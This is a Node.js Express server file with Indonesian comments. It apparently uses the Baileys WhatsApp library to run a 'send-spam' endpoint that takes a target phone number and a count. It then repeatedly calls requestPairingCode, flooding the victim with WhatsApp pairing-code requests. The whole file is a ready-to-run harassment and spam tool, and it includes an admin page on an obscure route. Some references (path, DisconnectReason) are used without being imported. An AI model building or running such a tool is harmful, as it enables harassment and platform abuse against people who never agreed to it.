const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const port = 3000; // Anda bisa mengganti port ini

app.use(bodyParser.json());
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html')); // Kirim file index.html
});
app.get('/wanzbrayy', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html')); // Kirim file index.html
});

async function KleeProject() {
    const { state, saveCreds } = await useMultiFileAuthState('./auth_info'); //Simpan di folder auth_info
    const KleeBotInc = makeWASocket({
        logger: pino({ level: "info" }), // Aktifkan logging
        printQRInTerminal: true, // Tampilkan QR Code DULU.  Setelah itu, matikan.
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
         browser: ["Ubuntu", "Chrome", "20.0.04"], // Optional
    });

     KleeBotInc.ev.on('creds.update', saveCreds); //Simpan credentials
     KleeBotInc.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if(connection === 'close') {
             //Reconnect jika koneksi terputus.
             const shouldReconnect = (lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log('connection closed due to ', lastDisconnect.error, ', reconnecting ', shouldReconnect);
             if(shouldReconnect) {
                KleeProject();
            }

        } else if(connection === 'open') {
            console.log('opened connection');
        }
    });
    return KleeBotInc;

}



let KleeBotInstance; // Simpan instance di luar fungsi

(async () => {
    KleeBotInstance = await KleeProject(); //Inisialisasi instance
})();



app.post('/send-spam', async (req, res) => {
    const { phoneNumber, spamCount } = req.body;


    // Validasi Server-Side (PENTING!)
    if (!phoneNumber || !/^\d+$/.test(phoneNumber)) {
        return res.status(400).json({ error: 'Nomor telepon tidak valid.' });
    }
    if (!Number.isInteger(spamCount) || spamCount <= 0) {
         return res.status(400).json({ error: 'Jumlah spam tidak valid.' });
    }


    const results = [];

    for (let i = 0; i < spamCount; i++) {
        try {
            let code = await KleeBotInstance.requestPairingCode(phoneNumber);
            code = code?.match(/.{1,4}/g)?.join("-") || code;
            results.push({ success: true, code });
        } catch (error) {
             let errorMessage = error.message;
            //  console.log(error);
             //Periksa pesan kesalahan dan berikan pesan yang lebih spesifik

             if (errorMessage.includes("can't send message to this number")) {
                 errorMessage = "Tidak dapat mengirim pesan ke nomor ini (mungkin diblokir atau bukan pengguna WA).";
             } else if (errorMessage.includes("timed out")) {
                 errorMessage = "Waktu permintaan habis. Coba lagi nanti.";
             } else if (errorMessage.includes("404")) {
                 errorMessage = "Nomor tidak ditemukan.";
             } // Tambahkan penanganan kesalahan lain yang lebih spesifik di sini
             
             results.push({ success: false, error: errorMessage });
        }
    }

    res.json({ results });
});

app.listen(port, () => {
    console.log(`Server berjalan di http://localhost:${port}`);
});
